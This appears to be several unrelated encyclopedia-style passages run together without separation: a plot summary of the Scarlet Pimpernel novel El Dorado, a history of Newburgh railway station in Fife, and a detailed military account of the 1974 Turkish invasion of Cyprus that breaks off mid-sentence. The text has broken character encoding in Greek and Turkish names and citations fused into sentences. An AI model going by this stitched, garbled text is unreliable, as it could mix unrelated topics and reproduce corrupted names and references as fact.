It was first published in 1913. The novel is notable in that it is the partial basis for most of the film treatments of the original book. A French-language version, translated and adapted by Charlotte and Marie-Louise Desroyses, was also produced under the title La Capture du Mouron Rouge. As well as containing all the main characters from the first book, El Dorado introduces several new characters and features the Baron de Batz, who also turns up in Sir Percy Leads the Band and The Way of the Scarlet Pimpernel (Baron Jean de Batz is a genuine historical figure). Plot summary It is 1794 and Paris, \\"despite the horrors that had stained her walls - has remained a city of pleasure, and the knife of the guillotine did scarce descend more often than did the drop-scenes on the stage.\\" The plot begins when Sir Percy, the Scarlet Pimpernel, reluctantly agrees to take Armand St. Just, brother of his wife, Marguerite, with him to France as part of a plan to rescue the young Dauphin. Percy warns Armand not to renew any friendships while in Paris, but it doesn't take long before Armand has ignored his warnings and renewed a friendship with the scheming Baron de Batz (in the pay of the Austrian government), who wants to free the Dauphin himself and despises the Scarlet Pimpernel and all he represents. Whilst attending the opera with De Batz, Armand foolishly tells him that he is in the league of the Scarlet Pimpernel. While there, he falls in love with a young actress named Citizeness Jeanne L'Ange. De Batz introduces the couple backstage at the theatre and once they have fallen for each other, De Batz tells Citizen Heron of the general committee of Public Safety where and when they have arranged to meet. After covering for Armand at her house, L'Ange is arrested and thrown into jail. Learning of her peril and in the throes of passion, Armand fails to trust Sir Percy who has told him that he will rescue Jeanne, and forgets his promise to his leader. Armand, desperate to share Jeanne's fate, runs to the gate of the Temple prison and screams, \\"Long Live the King.\\" There he's intercepted by none other than Percy's arch enemy, Chauvelin. Faced with the death of his love, Armand betrays Percy, unaware that The Pimpernel has already secured Jeanne's freedom. Sir Percy is then captured and imprisoned by Chauvelin and Heron in the cell that was home to Marie Antoinette in her last days. Chauvelin insists that Percy is to be deprived of sleep in the hope that he will be weakened and disclose where young Capet, the uncrowned King of France, is being held following his rescue. After 17 days in prison, Percy is sure that the dauphin has been transported safely into Holland. He then contrives, by pretending to crack and confess the dauphin's whereabouts, to make his escape. He tells Chauvelin and Heron that the dauphin is being held in an area in the north, near the coast of France, but that he has to show them, rather than tell them, because the paths are nameless and too small for them to find without him. Chauvelin and Heron, skeptical, bring along Armand and Marguerite as hostages. Once in the north, Percy takes advantage of a chance when Chauvelin and Heron are separated, and darkness, to subdue Heron, bind and truss him, put on his clothes, and direct the guileless French soldiers (who think that the bound Heron is Percy) to put him in the gated yard of a church. Percy, still thought to be Heron, drives a carriage with Marguerite and Armand inside to the coast, where his ship is waiting for them.

There have been several railway stations serving the town of Newburgh, Fife. The original was opened on 17 May 1848 by the Edinburgh and Northern Railway, on their line from to Hilton Junction, near . This station lasted until August 1906, when a larger replacement station was opened. Newburgh became a junction station on 25 January 1909, when the Newburgh and North Fife Railway company opened a line from Newburgh to Dundee. This route called at Lindores, Luthrie, and Kilmany, and was an attempt to provide a competitive service between Perth and Dundee via the south of the River Tay. The route diverged at a triangle junction just south of St Fort station. This alternative route to Dundee from Perth was not, however, a great success, as journey times were considerably longer. In July 1933, the line from Newburgh to Bridge of Earn was converted to single track. By this time, the station was in ownership by the London and North Eastern Railway. From 1948 the station was under British Railways ownership. In February 1951, the Newburgh (Glenburnie Junction) to St Fort line closed to passenger services. The station's history continued mainly uneventfully until 19 September 1955 when the station closed to passengers (along with the other intermediate stations between Bridge of Earn and Ladybank), but remained open for goods purposes.\\"The Newburgh and North Fife Railway\\"Past The Tracks; Retrieved 11 April 2016 On 13 May 1960, Newburgh (Glenburnie Junction) to Lindores closed completely, and Newburgh to Glenburnie Junction was singled, leaving a single line route between Ladybank and Perth. St Fort to Lindores remained open for freight until October 1964. Newburgh station loop remained intact, however, and in December 1971 was signalled for bi-directional working.Newburgh Loop in 1971Railscot; Retrieved 11 April 2016 This loop and the, by then, decaying Newburgh sidings were both removed in October 1980. From October 1975, British Rail reopened the line to regular passenger traffic once again, although not calling at the intermediate stations. This was an attempt to provide a shorter alternative route between Edinburgh & Perth to the existing one via Stirling (the old direct line through Kinross via and Glenfarg having closed in January 1970), as well as to provide connections between Perth and Edinburgh without the need to change trains. Today the station lies derelict - the platform and main building are both still intact, although gutted of all furnishings. It has been suggested many times that the station should be re-opened,\\"MSP makes the case to reopen Newburgh Station\\" Robertson, Aileen; The Courier news article 27 December 2013; Retrieved 11 April 2016 along with Abernethy and Bridge of Earn, as these places have slowly been developing over the past 25 years. The line from Ladybank to Perth forms part of the Edinburgh to Inverness Line. For now, though, the train service is replaced permanently by a bus, and to operate stopping services on the line may require loops in certain places (possibly even redoubling, as the line is already heavily used by / Perth - services). Occasionally, freight, London-bound trains and the Caledonian Sleeper services use this line if the route via Stirling is closed for maintenance. A few railtours have also been known to traverse the Newburgh line.

Topography of Cyprus. In 1974, Turkey captured the northern portion of the Republic of Cyprus in response to a military coup taking place on the island, in attempt to annex the island to Greece. Turkey claimed that this was an intervention in accordance to Treaty of Guarantee. The invasion consisted of two major Turkish offensives, and involved air, land and sea combat operations. The Greek Cypriot armed forces attempted to resist and respond to the attacks as part of a coordinated defence plan which proved inadequate to deal with the forces that Turkey was able to bring to bear, and the war resulted in a ceasefire which persists until the present day. Events leading up to the 1974 invasion of Cyprus The junta in Greece and political unrest The rule by the military in Greece started in the morning of 21 April 1967 with a coup d'√©tat led by a group of colonels of the military of Greece, with the government-in-exile and ended in July 1974.Matt Barrett, The Rise of the Junta in Greece The Makarios era The period of 1964 to 1974 was a turbulent era for the island, with the apparent breakdown of relations between the Greek Cypriot and Turkish Cypriot sides right across the spectrum of social and political ties. In 1963, the Turkish Cypriots had abandoned, both voluntarily and by external pressure, their constitutional presence in the Cyprus Government. Violence in Nicosia followed soon after. In 1964, the Cyprus National Guard intervened militarily against a perceived Turkish Cypriot militant threat in the north-west of the island, in and near to the Kokkina enclave, leading to direct confrontation with Turkey, who responded militarily but stopped short of invasion. During the unrest, the island began to incubate fanaticism on both Greek and Turkish Cypriot sides of enosis and taksim respectively, these being polar opposite ideologies. Enosis was an effort to unify the island with Greece, while Taksim simultaneously called for the partition of the island between Greeks and Turks.Cyprus 1974 ‚Äì The Greek coup and the Turkish invasion, Makarios Drousiotis, Hellenic Distribution Agency Military coup against Makarios III On 15 July 1974, the Cyprus National Guard, under the command of the Greek junta in Athens, launched a coup against the democratically elected President, Archbishop Makarios III. A large force of troops and tanks descended on the Archbishopric in Nicosia and laid siege to it, though Archbishop Makarios himself was able to escape. Troops defending the Presidential Palace resisted, and fighting in the area between pro-Makarios supporters and junta supporters continued for much of that day. A former EOKA member, Nikos Sampson, was promptly placed in power as de facto President of the Republic, though he later resigned on 23 July after support for his regime collapsed. The coup represented both a provocation against Turkey and an opportunity for Turkey to invade, citing concerns for the safety of the Turkish Cypriot community as its main goal. Operational situation and balance of forces on the eve of the war Turkish-Cypriot forces Following the 1963‚Äì1964 intercommunal violence, a relatively stable situation had ensued on the island. The Turkish-Cypriot population had retreated into enclaves, each comprising several villages, and having its own armed force. The biggest Turkish-Cypriot enclave was the Nicosia ‚Äì St.Hilarion enclave, also called G√ºnyeli enclave, with a 25,000-strong population, out of a total of 117,000 Turkish-Cypriots on the island,Sergis, p.254 and included the northern district of Nicosia and spanned north to the Pentadaktylos mountain range, but had no access to the sea. In 1964 Turkish-Cypriot fighters from Agirdag had occupied the Bogaz pass without a fight. Greek-Cypriot efforts to dislodge them by force were unsuccessful. As a result, the Turkish-Cypriot forces had control of the Nicosia ‚Äì Kyrenia highway, and access to the coastal area north of the Pentadaktylos. With the Bogaz pass in Turkish hands, the Greek forces had to use longer routes to access the north coast, namely the Panagra pass, on westesn Pentadaktylos. Other significant Turkish-Cypriot enclaves were that of Famagusta, of Lefka, of Tziaos (Serdarli), of Limasol, of Larnaka, of Pafos, of Limnitis, of Kokkina and of Louroutzina.Sergis, p.256 The total of the Turkish-Cypriot forces were 27 infantry battalions, grouped into 8 regiments, and a strength of potentially up to 20,000 men. The Turkish- Cypriot battalions were lightly armed and understrength, and they were generally limited to defensive capabilities. They also trained for unconventional operations, such as sabotage, ambushes etc. The Turkish forces included the Turkish Regiment in Cyprus (KTKA), of 1,000 men (nominal 650), organized in two groups, one in G√ºnyeli and one in Ortakoy. Greek-Cypriot forces The main force of the Greek Cypriots was the National Guard, created in the aftermath of the 1963‚Äì1964 intercommunal violence. The National Guard was equipped with surplus equipment from Greece, mainly of British origin, reinforced by a purchase of Soviet weapons in 1965. The National Guard comprised 15 active and 19 reserve infantry battalions, 3 active and 1 reserve commando battalions, 1 tank, 1 mechanized and 1 reconnaissance battalions, 6 field artillery battalions and other smaller units (such as AT artillery, AAA and engineer units). They were grouped into 5 military areas called High Tactical Commands (ATD), one Commando command, one artillery command etc. Its nominal total wartime strength was 40,000 men, of whom about 30,000 were to be mobilised reservists, with 32 tanks and 80 field artillery pieces, as well as about 100 armoured vehiclesSergis, p.257-258 The National Guard, controlled by officers sent from Greece (as Cyprus lacked trained officers), was seen as an instrument of Athens in the political tension between Athens and Nicosia. As a result, the Cypriot government neglected the reinforcement of the National Guard, with the single exception of the 1965 purchase, resulting in the mechanical equipment suffering badly of maintenance issues, and ammunition stocks being low and old. The Makarios government founded in 1972 the \\"Efedrikon Soma\\" (which translates as \\"Reserve Corps\\"), with police personnel. Officially, the Efedrikon was a heavy police force to reinforce the National Guard in wartime, in fact however it was Makarios‚Äô trusted counterweight against the Athens-controlled National Guard. The Efedrikon was lightly equipped with modern Czechoslovakian-supplied weapons and well trained in military style. It comprised 3 battalions.Karkaletsis, p.12 Another paramilitary force was EOKA B, which in 1974 had about 5,000 members with 1,000 firearms.Sergis, p.152 Smaller paramilitaries also existed, under political leaders and their lieutenants. The Greek regiment in Cyprus (ELDYK) was not under the National Guard‚Äôs direct control. It consisted of two infantry battalions, with 1,200 men (nominal 950).Sergis, p.260 It was well trained and organized but equipped with light and old weapons.Sergis, p.652. In July 1974ELDYK was in the process of reequipping with more modern equipment Together with the Commando regiment it was considered the best unit on the Greek-Cypriot side.Vlassis, Aporritos Attilas, p.111 Opposing plans The prospect of an invasion of Cyprus had already been considered in 1964. Definitive plans were created in 1967, which were subsequently renewed to accommodate any changes in the operational situation.ŒëœÄœåœÜŒ±œÉŒ∑ - ŒëœÄœåŒ≤Œ±œÉŒ∑, ŒúŒµœáŒºŒ≠œÑ ŒëŒªŒØ ŒúœÄŒπœÅŒ¨ŒΩœÑ, ŒïŒ∫Œ¥œåœÉŒµŒπœÇ ŒôœâŒ¨ŒΩŒΩŒ∑œÇ Œ¶ŒªœéœÅŒøœÇ, Athens 1984, page 49 (Greek translation of the Turkish original: \\"30 sicak g√ºn\\", Birand Mehmet Ali, Millyet, Istanbul 1976) According to the Turkish plan, the ultimate goal was the \\"Sahin\\" and \\"Attila\\" lines, namely the capturing of a large part of north Cyprus. The operation would be divided in two phases. The first objective, was the creation of a beachhead that would give access to the sea the Turkish-Cypriot enclave of G√∂nyeli. In order to give it a safe depth, it was planned that a triangle with a base of 18 km along the coast and 22 km depth should be secured. Following that, the Turkish planned to stop operations and seek a diplomatic solution. If diplomacy failed, they would forcefully pursue their second main objective, the \\"Attila\\" line. The first phase was expected to take 3 days, and the second 3‚Äì4 days, for a total of 6‚Äì7 days. Although the operation was considered hard, it was also considered simple, because the Turkish General Staff expected total supremacy in the Mediterranean. The biggest worry for the Turkish side was the Aegean, and the possibility of a Greek attack there. The Greek-Turkish border in Thrace was considered secure as it was heavily fortified and garrisoned.ŒëœÄœåœÜŒ±œÉŒ∑ - ŒëœÄœåŒ≤Œ±œÉŒ∑, ŒúŒµœáŒºŒ≠œÑ ŒëŒªŒØ ŒúœÄŒπœÅŒ¨ŒΩœÑ, ŒïŒ∫Œ¥œåœÉŒµŒπœÇ ŒôœâŒ¨ŒΩŒΩŒ∑œÇ Œ¶ŒªœéœÅŒøœÇ, Athens 1984, pages 49-50 (Greek translation of the Turkish original: \\"30 sicak g√ºn\\", Birand Mehmet Ali, Millyet, Istanbul 1976) The operation would include air, naval and ground forces.

The ground forces detailed for the operation were put under the command of the 6th Corps/Second Army. They included the \\"Cakmak Special Strike Force\\", a brigade level unit which would conduct the amphibious landing, the Commando brigade, the Parachute brigade, the 39th infantry division, the 28th motorised infantry division and elements of the 5th armoured brigade and the Jandarma.

The initial plan (drawn up by Georgios Grivas in 1964) was given the codename \\"Aphrodite One\\" and relied upon the presence of a full Greek division of 10,000 troops with heavy weapons. This division however, had been withdrawn from the island in 1967, and so a new plan was drawn up prior to 1974, named Aphrodite Two, and was to take the form of a major ground offensive against the enclaves, instigated at the initiative of the Greek Cypriots rather than the Greeks. This offensive should not be confused with the so-called \\"Aphrodite Three / Hephaestus Plan\\", which was drawn up in March 1974 by the EOKA-B coup-conspirators as a follow up to Aphrodite Two, but never put into action. 20 July 1974  Kyrenia and Pentemilli beachhead  In the early hours of the 20 July 1974, the Turkish armed forces launched an amphibious invasion of Pentemilli (Five Mile Beach) located on the northern coastline, approximately 8 km west of the main harbour town of Kyrenia. The Turkish naval force involved in transporting the amphibious forces originated from Mersin port and had first attempted to land at the beach of Glykiotissa, but this site proved inappropriate for a beachhead. Turkish frogmen transported by a gunboat searched Pentemilli for mines before the landing took place there.Savvas D. Vlassis, O Aporritos Attilas, Athens 2004 The Turkish landing forces, under the command of Brig.

Karaoglanoglu (39th Infantry Division) and one company of the 39th Divisional Tank Battalion (39th Infantry Division). This force consisted of around 3,000 troops, 12 M47 tanks and 20 M113 armoured personnel carriers, as well as 12 105mm howitzers. The landing was not contested until the first wave of Turkish forces were already ashore. At around 01:30, SEP/A radar set at Cape Apostolos Andreas, on the Karpass Peninsula, detected eleven Turkish ships approaching Kyrenia at a distance of . At around 05:00, two Greek Cypriot motor torpedo boats, the T-1 and T-3, were dispatched from Kyrenia harbour to engage the Turkish naval flotilla which had now been detected approaching the coastline. The T-1 was hit by 40mm anti-aircraft fire and sank, while a few minutes later, the T-3 was destroyed by combined fire from ships and aircraft, and sank with the loss of all but one of its crew.Hellenic Nationalist Page ‚Äì Cyprus 1974 Timeline The first Greek Cypriot units to reach the area were two companies of the 251st Infantry battalion, supported by a platoon of five T-34 tanks seconded from 2nd Company, 23ŒïŒúŒë Medium Tank battalion.Armour in Cyprus, Evolution and Action. Ioannis Mamounidakis. 2008. This force engaged the Turkish landing force at around 10:00 am, with sporadic artillery support from nearby artillery battalions. The attack initially resulted in the destruction of two Turkish recoilless rifle positions and some other casualties, but was unsuccessful in dislodging the beachhead force. An attempted Turkish counter-attack, supported by M113 APCs, resulted in the destruction of two of these vehicles by the T-34s. Once the 251st battalion retreated to the east (towards Kyrenia), the Turkish force advanced 1 km to the west, and then proceeded to advance further east. Of the T-34s, four were lost in combat, and the fifth was abandoned at the camp of the 251st battalion. Air-attacks proceeded against Greek Cypriot targets in and around Kyrenia, with the army base at Kokkinotrimithia strafed, knocking out two Marmon-Herrington Mk-IVF armoured vehicles and a Daimler Dingo fighting vehicle. The main football stadium at Kyrenia was also attacked, destroying two BTR-152 armoured personnel carriers which were spotted there. Greek Cypriot artillery units involved in the suppression of the Turkish beachhead included: the 182MPP battalion, which was from the Maki Giorgalla camp in the Bosporous area of Kyrenia district ‚Äì this unit was deployed with twelve 25-pounder guns and six anti-aircraft guns of 12.5mm and 14.5mm. The unit abandoned two guns at its camp due to lack of tractors, and then lost two guns and a tractor in a road accident on the Lapithou-Kyrenia road. From its firing positions at Saint Pavlos, the battalion fired shots at the Turkish beachhead and in turn, took casualties from naval and air attack during the day; the 190 MA/TP battalion, which was from Iakovos Patatsos camp in the region of Karavas, Kyrenia. This battalion had eighteen anti-tank guns of 57mm, but only twelve tractors to move them. The force abandoned its camp at 05:15 and was attacked by Turkish aircraft, without losses. Divided into two formations of six guns, the battalion attacked Turkish forces at Panagron, and also shot at the Turkish beachhead at Pentemilli, forcing Turkish naval vessels to briefly retreat back out to sea; the 191POP artillery company (under the control of 181MPP) from Nikos Georgiou camp at Saint Savvas region of Kyrenia, engaged the Turkish Army from its firing positions at Bellapais, and executed shots at Turkish forces in Aspri Moutti and Kotzia Kagia; the 198POP artillery company, equipped with four guns of 75mm and six anti- aircraft guns, based in the western Kyrenia mountains. This unit had sustained the loss of vehicles, radios and ammunition in a forest fire on 16 July, and was in poor shape when it engaged Turkish paratroopers at Saint Hilarion castle on 20 July, in support of mountain commando forces in the area.http://www.pyrovolitis.org.cy (Official website of the Department of Artillery The Greek Cypriot 326th and 306th Infantry battalions, located in the area, failed to play an immediate role in the resistance against the Turkish landing. Two battalions, the 281st infantry battalion and the 286th Mechanised Infantry battalion (+3 tanks) were sent from Nicosia to reinforce the defences at Kyrenia, but both were attacked by Turkish aircraft at the village of Kontemnos, resulting in the destruction of soft-skin vehicles, six BTR-152 armoured vehicles, and the killing of the commander of the 286th battalion, Lt Col. Georgios Boutos. The 316th infantry battalion was sent from Morphou along the road to Kyrenia, only to be ambushed and forced into defensive positions at a Turkish roadblock. The 316th battalion then regrouped and joined forces with elements of the 286th battalion (equipped with 3 T-34 tanks) which had now arrived. In response to the invasion, a National Guard staff officer, Lt. Colonel Konstantinos Boufas, was sent in an armed motorcade to the western area of Kyrenia in an effort to coordinate a counter-attack. His plan was to engage the Turks at night on the western front, using the available elements of the 281st, 316th and the 286th battalions, along with a unit of anti-tank rifles and three T-34 tanks. The attack was successful in forcing a temporary retreat from the Turks, but this resulted in a counter- attack, and Boufas' force dug-in. One of the three Greek Cypriot T-34 tanks attached to the 286MTP was hit by Turkish anti-tank fire and knocked out. The 306th Infantry battalion arrived late and attacked the Turkish forces from the east, but failed to gain any ground. Meanwhile, the \\"Pantazis\\" irregular battalion arrived and attack from the south, but also failed to achieve anything decisive. At some point during the night action, the Turkish commander of the 50th Infantry Regiment, Col. Karaoglanoglu, was killed by a M20 Super Bazooka friendly shot fired at the villa he was based in.  Vicinity of Nicosia  At around 06:00, a company of Turkish paratroopers was dropped over Mia Millia, just north of Nicosia, right on top of Greek Cypriot forces approaching Geunyeli. Of the estimated 120 troops dropped, a total of 93 were killed or wounded, and one captured, while the rest escaped. At around 07:30, a battalion of 550 troops of the ELDYK contingent, supported by 19 tanks of the 23 ŒïŒúŒë Medium Tank battalion, as well as one Cypriot National Guard company, commenced an attack on the Turkish enclave of Geunyeli, just north-west of Nicosia. Geunyeli was a strategic target due to its position controlling the Nicosia-Kyrenia main road, and had to be captured by the Greeks in order to ensure reinforcements to Kyrenia. This enclave was heavily fortified by the Turkish forces, in preparation for just such a siege, and was protected by bunkers, machine gun nests and anti-tank trenches. Positioned within the enclave was the Geunyeli Group of the TOURDYK contingent of the Turkish Army, comprising the 2PB 2nd Infantry Company, 3PB 3rd Infantry Company and the ASB Heavy Weapons Company.Representative of Peloponnesian ELDYK The attack began with the shelling of Geunyeli by tanks and artillery, which resulted in a Turkish reply via air attacks, but because of the prevailing smoke from bombardment and smoke mortars, these proved to be largely inaccurate. An attempt by the Greek Cypriots to make a direct coordinated attack with their tanks resulted in disaster, with two T-34s destroyed by artillery, and two T-34s becoming trapped in an anti-tank ditch. As the battle progressed, Turkish parachutists continued to drop in and around the enclave, leading to some unavoidable casualties. The 185MPP artillery battalion, based at Camp \\"Andreas Karvou\\" at Athalassa, Nicosia, equipped with twelve 25-pounder guns and six anti-aircraft guns (four .50cal and two 14.5mm) moved to its firing positions outside the camp. Before it could commence attack of Geunyeli, however, it was attacked by the Turkish Air Force, resulting in the loss of five 25-pounder guns and six soldiers. Its remaining guns shelled Geunyeli and then moved at midday to the vicinity of the Abbey Makedonitisas.http://www.pyrovolitis.org.cy The 184MGP artillery company, also based at Camp \\"Andreas Karvou\\", managed to rescue its armament of six 25-pounder guns and two .50cal anti-aircraft guns from the burning base following the air attack, though it lost three personnel killed. It initially fired shots from the camp at Geunyeli, before moving with the 185MPP to Abbey Makedonitisas, where it continued to fire on Geunyeli, and received a Turkish air attack without loss. The Greeks withdrew to the south-west and then called for reinforcements for a second coordinated attack using their remaining 15 tanks, and the 361st and 399th infantry battalions, these new forces tasked to circling in from the north and east to encircle and destroy the enclave. However the coordinated attack, planned for 18:00, failed to take place as the 399 battalion was delayed by fighting with Turkish Cypriot militia. When the 399th battalion arrived, it attempted to attack the enclave on its own, but achieved little success and so withdrew.Hellenic Nationalist Page ‚Äì Timeline of 1974 Invasion  In other areas  At around 10:00, 450 EOKA-B fighters of the 203rd reserve infantry battalion attacked the Turkish Cypriot enclave at Limassol, where approximately 1,000 lightly armed inhabitants were situated. Simultaneously, 100 EOKA-B fighters engaged the Turkish Cypriot enclave of Avdimou, west of Limassol, rounding up Turkish Cypriots as POWs to be taken to the main stadium at Limassol. At around 17:00, the Greek landing ship tank (LST) Lesvos (L-172) commanded by Lt Cdr E. Handrinos arrived at Paphos and began to shell Turkish-Cypriot positions at the enclave close to the harbour with her 40mm anti-aircraft guns. The vessel then unloaded some 450 troops of the ELDYK replacement force at Paphos, and immediately headed back out to sea to evade the enemy. Lesvos was interpreted by the Turks as part of a larger task force, ultimately leading to the arrival of the three Turkish destroyers which the Turkish Air Force mistakenly attacked. At 18:00, Security Council Resolution 353 was adopted unanimously. A cease-fire was to take effect on 22 July at 16:00. At around 22:00, the Turkish Cypriot militia in Paphos issued a general surrender. At the same time, Turkish Cypriot militia and civilians in Famagusta took cover behind the walls of the old city and prepared for a siege. At 23:00, the Greek Cypriot mountain commando forces launched a coordinated night attack just north of the Agyrta-Nicosia enclave, attempting to secure and blockade the Agyrta-Nicosia pass through the Pentedaktylos mountains. The 31MK and 33MK Commando attacked from the west, while the 32MK and 34MK Commando attacked from the east.OI HPOEZ tou 1974, Kostas Xp. Tzoptzhe, Lefkosia 2003 21 July 1974 There was little or no armed contact at the beachhead on 21 July 1974, and during this time the second wave of Turkish forces departed from Mersin port. Following the dispatch of the Hellenic Navy landing ship tank (LST) Lesvos (L-172) to Paphos and the shelling of the local Turkish Cypriot enclave, the Turkish Air Force received reports of a Greek task force of ships off the coast of Paphos. In response, it assembled a force of around 28 strike aircraft from two squadrons to attack the flotilla with bombs and guns. This however, was a signals deception performed by the Greek Cypriot Naval Command, which transmitted false radio signals indicating that the destroyers sailing off Paphos were Greek. In fact, these were actually the Turkish Navy destroyers Kocatepe, Adatepe, and Mare≈üal Fevzi √áakmak that had been sent to search for Lesvos. In the early afternoon, all three vessels were struck by friendly aerial fire. Kocatepe sustained a fatal hit and sank with the loss of 54 crew members.\\"Cyprus, 1974\\", by T. Cooper and N. Tselepidis, published 28 October 2003 for ACIG.org. Having intercepted intelligence that the Greek Cypriot Commander of the Navy, Commander Papayiannis, was heading to Karavas to assess the size and dimensions of the Turkish landing force, a team of 12 Turkish parachutists were dropped on the Mirtou-Asomatou road in order to ambush his convoy. The Turkish troops managed to wound Papayiannis before they were wiped out by his personal guard force, forcing the Greek Cypriot plan to be abandoned. Map depicting approximate geography of the Attila-1 offensive as of 21 July 1974. In the evening, the ruling Junta in Athens agreed upon an arrangement to dispatch clandestine reinforcements to assist the Greek Cypriots, in the form of an infantry battalion, a commando battalion and a battalion of medium tanks. An initial effort was made to dispatch these forces using the large vehicle ferry Rethymnon, which took on board the 537th Infantry battalion, a battalion of tanks and 500 Cypriot volunteers (primarily EOKA-B supporters). This vessel set sail from Piraeus that evening.  Kyrenia and Nicosia areas  On the same evening, the Hellenic Air Force commenced a clandestine air-lift operation (Operation Niki) using 15 Noratlas aircraft (354 Squadron \\"Pegasus\\") in an effort to transport a battalion of commandos from Souda, Crete to Cyprus. However, the aircraft were erroneously engaged by Greek Cypriot anti-aircraft guns of the 195 MEA/AP battalion at Nicosia International Airport, and the third Noratlas was shot down with the loss of four crew and 29 commandos. A further two Noratlas planes were also badly shot up, and forced to make hard landings, at which point the mistake was realised. Some of the remaining planes were able to make safe landings and offload their troops and equipment, resulting in a Greek contingent available to defend the airport. This unit was the A Commando, later given the Greek Cypriot designation 35MK Commando. OPERATION \\"NIKI\\" 1974 ‚Äì A Suicide Mission to Cyprus. (Mihail Solanakis).Hellenic Wings at Cyprus (Lt. General (ret) George Mitsainas, At Kyrenia, the 251st battalion had now moved to the village of Trimithi to mount its defence of the town, while the 241st and Engineer battalion moved east of Kyrenia, with the latter tasked to mining the coastline. At the Agyrta-Nicosia pass, the Greek Cypriot mountain commando forces achieved their objectives, with the 31MK and 33MK arriving from the west to capture the Kotsakagia mountain top, while the 32MK arrive from the east to force a Turkish retreat from the pass. In a disastrous strategic move, the four Greek Cypriot mountain commando battalions were ordered to move from the Pentedaktylos mountains (where they had created a virtual blockade across the line of a Turkish bridgehead) and sent in the direction of Agios Pavlos. The 187MPP artillery battalion, which was badly damaged by Turkish air attack at its camp the previous morning, went into battle with just four surviving 100mm guns out of its original twelve. The previous day, it had fired a number of shots at the Turkish Cypriot enclave in northern Nicosia, as well as at Saint Hilarion. On the 21st, it moved to a new position at Gerolakkos under cover of night, and shelled Saint Hilarion in support of National Guard and ELDYK forces.http://www.pyrovolitis.org.cy Website of the Department of Artillery Some National Guard troops reportedly retreated to Bellapais in UN rovers and flags, reportedly captured from Finnish UNFICYP troops. However, the National Guard garrison in Bellapais was subjected to an air attack, in which napalm was reportedly used. At 06:30, a truce took effect around the Ledra Palace Hotel in Nicosia, with 386 tourists being trapped inside. However, the truce was broken at 11:00, when fighting took place in Nicosia. The hotel was targeted by heavy mortar fire.  Other Turkish Cypriot enclaves  At around 06:00, all Turkish-Cypriot resistance at Limassol collapsed under the weight of a Greek Cypriot assault, and approximately 1,000 POWs were taken. Meanwhile, the Turkish-Cypriot held village of Pileri was captured by the 231st Infantry battalion. In Larnaca, talks for a ceasefire broke down at 03:35 and heavy fighting erupted, with the National Guard using artillery and mortar fire. By 10:30, Turkish Cypriots reportedly began their surrender. At 04:45, Greek Cypriot forces attacked Lefka with mortars and heavy machine guns. At 08:45, high-level bombing, shelling and rockets followed. Limnitis was surrounded by the National Guard and sporadic fighting took place in Denizli.United Nations Security Council, Report of _the Secretary-General on developments in Cyprus, 21 July 1974, S/11353 22 July 1974 Kyrenia area A second wave of Turkish amphibious forces arrived at the Pentemilli beachhead. Codenamed \\"Bora Task Force,\\" it included a tank company and a mechanised infantry company, under the command of Brig. Gen Haki Boratas. Turkish forces under the command of Maj. Gen Bedrettin Demirel, comprising the Bora Task Force, and the 50th Regiment, proceeded to launch at attack against the primary objective of Kyrenia, the main harbour town on the northern coast. For the Greek Cypriots, command of the counter- invasion force was changed to the leadership of Col. Kobokis, a commander of the Raiders commando force, situated in the Pentedaktylos (Kyrenia) mountain range. The Greek Cypriot High Command also sent reinforcements in the form of a mechanised company of the 346th infantry battalion, as well as an anti-tank platoon of the 120th artillery company. Meanwhile, on the eastern flank, the 306th infantry battalion had retreated to Kyrenia, leaving behind the 251st infantry battalion, as well as a half-strength battalion of the 33MK Commando, located at Agios Georgios village. The Turkish attack on Kyrenia commenced around 11:00 am, resulting in an onslaught against the 33MK Commando. 306th and 251st battalions, with limited anti-tank capability, were forced into full retreat towards Kyrenia. An intervention by the nearby 241st infantry battalion, attempting to build a defensive line to the west of Kyrenia, failed, and the force was overrun. Consequently, the Turkish advance towards Kyrenia along the northern coastal road was resisted by two mobile lines of defence bisecting their path. In the first instance, the defence of the 33MK was only able to achieve the destruction of two Turkish M47 tanks which were defeated by 106mm recoilless rifles. The failure to hold the Turkish force back meant that the second line was swiftly impacted, with the 241st battalion managing to immobilise a third M47 with an anti-tank rocket. The fast and aggressive nature of the Turkish assault meant that two further M47 tanks were lost in the vicinity of the Kyrenia Castle to infantry attack, bringing total tank losses on that day to 5 tanks along with 23 casualties. Turkish forces entered Kyrenia and then divided into two separate forces ‚Äì one seeking to establish a new beachhead in the Kyrenia harbour while the second force headed to Boghazi-Argypta pass to unite with paratrooper forces landed there. By the end of the afternoon, a solid bridgehead had been formed between Kyrenia and the centrally-located village of Geunyeli, the latter strategically positioned on the Kyrenia-Nicosia road. The Turkish-Cypriot fortified base at Geunyeli was now under the control of Lt. Gen Nuretin Ersin (6th Corps).  Famagusta  The 199MGP artillery company, equipped with four guns of and two .50cal anti-aircraft guns, completed its artillery assault against the Turkish Cypriot enclaves at Sakarya, Karaoglu the old city of Famagusta, after two days of shelling in support of the 201st and 386th battalions. During the 20th and 21st, this unit had been firing from Klapsidon, though on the 22nd, it moved to the vicinity of the Abbey of Apostlos Barnabas.http://www.pyrovolitis.org.cy ‚Äì Official website Department of Artillery  Nicosia - Saint Hilarion enclave and surrounding areas  At 15:00, the Turkish air force launched a heavy air attack on the Nicosia airport. A ceasefire took place at 16:00, only to be broken by further bombing at 17:15. Ground fighting took place near the Greek Cypriot village of Dikomo at 18:15. Heavy fighting took place in the Trakhonas area, and a battalion of Turkish paratroopers was dropped in Bogaz at 13:30. UNFICYP troops had to abandon Camp Tjiklos in the Kyrenia district with the refugees under their supervision at 14:20 due to heavy fighting and forest fires.UN Security Council, Further progress report by the Secretary-General on developments in Cyprus, 22 July 1974, S/ll353/Add.3 The 189MPP artillery battalion, equipped with eight guns of 100mm and six anti-aircraft guns (4 x .50cal, 2 x 14.5mm), operated from Camp \\"Christ Samartian\\" at Athalassas in Nicosia, close to the airport with an observation post at the ELDYK camp, completes its heavy artillery assault against the targets of Geunyeli and shots against Turkish helicopters in the area. This battalion was repeatedly bombed by the Turkish Air Force, with no losses up to 22 July. The 185MPP artillery battalion commenced an attack against the Turkish enclave of Geunyeli ‚Äì Saint Hilarion, which continued until the adoption of the ceasefire.  23 July 1974  Nicosia's Airport was the site of significant fighting during the invasion. The Greek A Commando (35MK Commando) Force based at the Archbishop School in Nicosia was given its orders ‚Äì the battalion force of three commando LOK companies (41, 42, 43 LOK) was to be transported immediately to Nicosia International Airport to defend it from an anticipated attack by Turkish forces moving through the Kyrenia-Nicosia bridgehead. The airport was already defended by a company of Greek Cypriot commandos, a company of ELDYK infantry and a company of Airport paramilitary police, the latter equipped with anti- tank weapons and five M8 Greyhound armoured vehicles.Battle of Nicosia International Airport ‚Äì 